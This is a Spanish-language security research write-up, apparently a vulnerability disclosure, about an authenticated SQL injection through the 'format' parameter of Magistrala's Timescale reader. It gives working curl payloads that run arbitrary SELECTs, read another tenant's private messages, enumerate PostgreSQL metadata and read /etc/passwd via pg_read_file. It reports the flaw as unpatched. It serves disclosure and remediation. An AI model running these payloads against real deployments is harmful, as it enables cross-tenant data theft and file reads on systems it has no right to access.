security research / magistrala

Timescale Reader SQL injection_

MediumSQL injectionNo response
MagistralaSQL InjectionTimescaleDBMulti-tenant

Alcance: la validación se realizó en un despliegue Docker local de Magistrala v0.40.0 / main. El hallazgo fue reportado mediante GitHub Security Advisory como GHSA-pfmm-h79v-449g; el maintainer no respondió y no hay versión corregida publicada.

Durante la revisión del servicio timescale-reader encontré una SQL injection autenticada a través del parámetro de consulta format en:

GET /{domainID}/channels/{channelID}/messages

El valor de format se utilizaba directamente dentro de la cláusula SQL FROM. Un cliente autenticado con acceso a un canal podía inyectar una tabla derivada y ejecutar consultas SELECT arbitrarias mediante la conexión de base de datos del lector Timescale.

La explotación permitió saltarse el aislamiento entre canales y dominios: la petición se autorizaba contra un canal permitido, mientras que la tabla derivada podía leer mensajes de otro canal privado. En el despliegue probado, la conexión utilizaba el usuario PostgreSQL magistrala con is_superuser=on, lo que también permitió enumerar metadatos y leer archivos del contenedor PostgreSQL mediante pg_read_file.

Origen del parámetro

El valor vulnerable se leía directamente de la solicitud HTTP en:

readers/api/http/transport.go
format, err := apiutil.ReadStringQuery(r, formatKey, defFormat)
...
Format: format,

Más adelante, el valor se utilizaba como relación SQL sin una allowlist de formatos o nombres de tabla conocidos:

readers/timescale/messages.go
if rpm.Format != "" && rpm.Format != defTable {
    format = rpm.Format
}

totalQuery := fmt.Sprintf(`SELECT COUNT(*) FROM %s WHERE %s;`, format, where)
...
q = fmt.Sprintf(`SELECT * FROM %s WHERE %s %s %s;`, format, where, orderClause, pgData)

El parámetro podía suministrarse como una tabla derivada en lugar de un nombre de tabla normal:

(SELECT ... FROM messages WHERE channel = '<victim_channel>') AS injected

Ruptura del aislamiento

La autorización se basaba en domainID y channelID presentes en el path de la URL. Sin embargo, la fuente SQL utilizada por el reader quedaba controlada por format.

La tabla derivada podía devolver el channelID autorizado en su columna channel, de modo que el filtro externo siguiera considerándose válido mientras los datos reales procedían de otro canal o dominio:

endpoint autorizado: Domain A / Channel A
                        ↓
format controlado: tabla derivada sobre Channel B
                        ↓
filtro externo ve:   Channel A
datos reales:       Channel B

El resultado era la ejecución de SELECT arbitrarios a través de la conexión Timescale, con bypass del límite de aislamiento de canales y dominios.

Prueba de concepto local

La validación se realizó contra un despliegue Docker local. El escenario contenía:

  • Domain A, donde el cliente atacante tenía acceso a Channel A.
  • Domain B, separado y privado.
  • Channel B, donde el cliente atacante no tenía permisos.
  • Un mensaje de prueba en Channel B con el marcador PRIVATE_DOMAIN_B_MARKER_456.

Las variables siguientes representan valores del laboratorio:

export READER_URL="http://localhost:9011"
export DOMAIN_A="<AUTHORIZED_DOMAIN_ID>"
export CHANNEL_A="<AUTHORIZED_CHANNEL_ID>"
export DOMAIN_B="<PRIVATE_DOMAIN_ID>"
export CHANNEL_B="<PRIVATE_CHANNEL_ID>"
export CLIENT_TOKEN="<CLIENT_TOKEN_WITH_SUBSCRIBE_PERMISSION_ONLY_ON_CHANNEL_A>"

1. Acceso directo denegado

Primero confirmé que el token no podía leer directamente el canal privado:

curl -i \
  "$READER_URL/$DOMAIN_B/channels/$CHANNEL_B/messages?limit=10" \
  -H "Authorization: Client $CLIENT_TOKEN"

HTTP/1.1 403 Forbidden
{"message":"failed to perform authorization over the entity"}

2. Ejecución de SELECT arbitrario

El siguiente formato construía una tabla derivada con expresiones PostgreSQL que devolvían el contexto de ejecución:

PAYLOAD="(SELECT CAST('${CHANNEL_A}' AS varchar) AS channel,
CAST(EXTRACT(EPOCH FROM NOW()) AS bigint) AS created,
'' AS subtopic, 'poc' AS publisher, 'poc' AS protocol,
jsonb_build_object(
  'current_user', current_user,
  'current_database', current_database(),
  'is_superuser', current_setting('is_superuser', true),
  'server_version', version()
) AS payload) AS injected"

curl -i -sS -G \
  "$READER_URL/$DOMAIN_A/channels/$CHANNEL_A/messages" \
  -H "Authorization: Client $CLIENT_TOKEN" \
  --data-urlencode "limit=10" \
  --data-urlencode "format=$PAYLOAD"

La respuesta del despliegue probado confirmó el contexto de base de datos:

{
  "current_database": "magistrala",
  "current_user": "magistrala",
  "is_superuser": "on"
}

3. Lectura cross-domain

Después de confirmar la ejecución de expresiones, utilicé una tabla derivada que leía mensajes de Channel B y presentaba Channel A como el canal externo:

PAYLOAD="(SELECT CAST('${CHANNEL_A}' AS varchar) AS channel,
time AS created, COALESCE(subtopic, '') AS subtopic,
publisher, protocol,
jsonb_build_object(
  'source_domain', '${DOMAIN_B}',
  'original_channel', CAST(channel AS text),
  'string_value', string_value,
  'time', time
) AS payload
FROM messages WHERE channel = CAST('${CHANNEL_B}' AS uuid)) AS injected"

curl -i -sS -G \
  "$READER_URL/$DOMAIN_A/channels/$CHANNEL_A/messages" \
  -H "Authorization: Client $CLIENT_TOKEN" \
  --data-urlencode "limit=10" \
  --data-urlencode "format=$PAYLOAD"

La respuesta incluyó el marcador privado de Domain B:

{
  "channel": "<AUTHORIZED_CHANNEL_ID>",
  "payload": {
    "source_domain": "<PRIVATE_DOMAIN_ID>",
    "original_channel": "<PRIVATE_CHANNEL_ID>",
    "string_value": "PRIVATE_DOMAIN_B_MARKER_456"
  }
}

La petición fue autorizada contra Domain A / Channel A, pero devolvió el mensaje de Domain B / Channel B.

4. Enumeración de metadatos PostgreSQL

La misma primitiva permitió consultar bases de datos disponibles:

jsonb_build_object(
  'current_database', current_database(),
  'databases', (
    SELECT jsonb_agg(datname)
    FROM pg_database
    WHERE datallowconn = true
  )
) AS payload

El resultado del laboratorio incluía:

{
  "current_database": "magistrala",
  "databases": ["postgres", "magistrala", "template1"]
}

También fue posible enumerar tablas visibles en la base de datos actual:

SELECT jsonb_agg(table_schema || '.' || table_name)
FROM information_schema.tables
WHERE table_schema NOT IN ('pg_catalog', 'information_schema')

Entre las tablas devueltas estaban public.messages, public.gorp_migrations y relaciones internas de TimescaleDB.

5. Lectura de archivos del contenedor PostgreSQL

Debido a los privilegios de la conexión en el entorno probado, también confirmé lectura de archivos mediante pg_read_file:

jsonb_build_object(
  'file', '/etc/passwd',
  'sample', pg_read_file('/etc/passwd', 0, 500),
  'current_user', current_user
) AS payload

La respuesta incluía entradas Unix desde el contenedor PostgreSQL:

{
  "current_user": "magistrala",
  "file": "/etc/passwd",
  "sample": "root:x:0:0:root:/root:/bin/sh\\nbin:x:1:1:bin:/bin:/sbin/nologin\\n..."
}

Esta capacidad dependía de los privilegios de la conexión PostgreSQL y fue confirmada únicamente en el despliegue Docker probado.

Impacto

Un cliente autenticado con acceso a un único canal podía ejecutar consultas SELECT arbitrarias mediante la conexión de base de datos del Timescale reader.

  • Lectura de mensajes de otros canales y dominios.
  • Bypass del aislamiento de tenants impuesto por la autorización HTTP.
  • Enumeración de bases de datos, tablas y metadatos PostgreSQL.
  • Lectura de archivos del contenedor PostgreSQL mediante pg_read_file cuando la conexión tenía privilegios suficientes.
  • Acceso a cualquier dato visible para el rol de base de datos utilizado por el reader.

Corrección sugerida

  • No concatenar directamente format en las consultas SQL.
  • Restringir format a una allowlist estricta de formatos o tablas internas válidas.
  • Tratar format únicamente como un identificador validado, nunca como una expresión SQL o tabla derivada.
  • Ejecutar el Timescale reader con un rol PostgreSQL de mínimo privilegio y sin permisos de superusuario.
  • Añadir pruebas que comprueben aislamiento entre dominios y canales cuando el formato sea controlado por el cliente.

Estado

El hallazgo fue reportado mediante GitHub Security Advisory como GHSA-pfmm-h79v-449g. El maintainer no respondió y no hay versión corregida publicada.
